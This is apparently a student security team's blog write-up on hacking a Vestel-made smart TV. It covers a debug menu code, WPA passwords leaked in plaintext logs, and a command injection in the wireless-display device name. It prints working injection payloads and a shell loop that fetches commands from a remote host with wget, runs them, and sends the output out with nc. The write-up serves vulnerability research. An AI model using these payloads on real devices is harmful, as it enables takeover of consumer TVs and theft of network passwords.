---
title: "Hacking A Vestel TV"
date: 2023-02-07T21:35:39+01:00
draft: false
---
# Hacking A Vestel Smart TV
The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target.
The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer.
Vestel makes TV's for several well known vendors:
1. Toshiba
2. Hitatchi
3. Medion
4. Polaroid
5. Finlux

The TV's come repackaged with a vendor specific config, but seem to otherwise be the same.

We found several bugs in the Vestel firmware:
1. Plaintext WPA password disclosed in logs
2. Command injection in device name

# Background
We started our analysis by exploring the functionality of the TV.
It contains what you would expect from a modern smart TV, 
including a webbrowser, apps, and an appstore.
Despite the TV looking like it was build with android, the appstore contained
next to no apps.

Some TV's come installed with the google play store, if that is the case then
a good first step is to download termux or similar.

Since this was not the case we were stuck with exploring the UI.

This yielded very little in the begging, so we decided to unscrew the backpanel
to get access to the main board.

The back panel came off easily and we could locate the mainboard, that contained the board model.
![Picture of the board](/Images/vestel_board_image.jpg)

The model of the board is `Vestel17B180E`, a bit of googling revealed the service manual [here](https://portal.repairtech.co.uk/downloads/17MB180E_SERVICE_MANUAL.PDF).
This shows a bunch of useful info, we might have needed if we didn't find another bug.

Googling vestel TV functionality led to the discovery of the debug menu.
This can be entered by:
1. Pressing home on the remote
2. Pressing `4725` on the numpad

![Debug menu](/Images/vestel_debug_menu.jpg)

The above screenshot shows an option regarding UART, which made us hopeful for UART access.
Despite a few hours of trial and error, we did not manage to read data from it however.

# Plaintext Password Disclosure
This bug is less severe but quite fun.
By dumping the logs to a FAT32 formatted thumbrive, using the dump logs option in the debug screen,
we noticed the plaintext password of the wifi's we had recently connected to.
Despite this not being a severe vulnerability, it still meant we could dump the phone hotspot passwords
of the TV's in our uni. Since most students would connect the TV to their phones hotspot if need be.

The password shows up in a log line looking like:
```
[PskEncryption, 1778]cmd = wpa_passphrase "wifi-name" "password"| grep '\spsk='
```

# Command Injection
The OS contains a command injection vulnerability in the device name.
By selecting `wifi display` as a source, a new menu item will appear in the settings menu.
This option is for changing the device name of the TV in wifi peering mode.
Changing this option triggers the following command to be run as the aurora user:
`sed -i 's/^device_name=.*/device_name=; [user input]' /conf/Miracast_Adapter.config`

We could confirm the vulnerability by entering `'; reboot &'`, which would reboot the TV.

## Getting useful execution
Rebooting is not a very useful primitive. We want to execute anything on the device.
This presented a problem because the input field for the device name was limited to 20 chars.
Two of which would go to the initial escape chars, so we're left with 18 characters of injection.

A quick brainstorm was made, and it was decided that the easiest method of payload delivery would be 
through the USB port.

Essentially, because the TV auto mounts any FAT32 usb that gets inserted, the mount path just needed to be short enough to put in the field. We could then put an executable named a single char, and get it to run.

Revisiting the logs, we found the mountpoint to be `/mnt/hd0a/` for our USB.
We then compiled a reverse shell to the specific ARM chip and executed:
```
';/mnt/hd0a/a &'
```
But nothing...

It turns out that for some reason the FAT32 did not support us making the file executable.
Annoying as that was, we managed to sidestep the issue using `sh` and shellscripts instead.
In  most shells you can execute `sh<script.sh` which is equivalent to `cat script.sh | sh`.
The file does not need to be executable because `sh` will be interpreting the script directly from stdin.

```
';sh</mnt/hd0a/a &'
```
This ended up being the final payload, with a shell script that would reboot the device.
![Shell injection](/Images/vestel_shell_inject.jpg)

Once we had access to the files on the TV, we were able to find the actual vulnerability doing some reverse engineering. It is located in the **ICE_WiDiResetFriendlyName** function of the aurora.elf file.


## Getting a shell (ish)
We tried various reverse shell payloads on the TV, but nothing worked.
After messing about with this for a few hours (we needed to manually insert the injection, as well as replace the file on the USB every time), we decided on going 100% jank and creating a pseudo shell instead.

The final shell would look like the following:
```
while True
do
wget http://192.168.0.6:8000/cmd -O - | sh 2&>1 | nc 192.168.0.6 8888 
sleep 2
done
```
On the networked machine, we would then start a webserver serving the `cmd` file with the command we wanted to run, as well as a listener with `nc` on port 8888 to recieve the results.
This worked, and we could browse the system without having to unplug and replug a USB for every command.

## Further Analysis
After messing around in the file system as a restricted user, we wanted to step up and find some over the air vulnerability.
We also wanted to explore the oppertunities for rooting the device.
This is still on the drawing block.
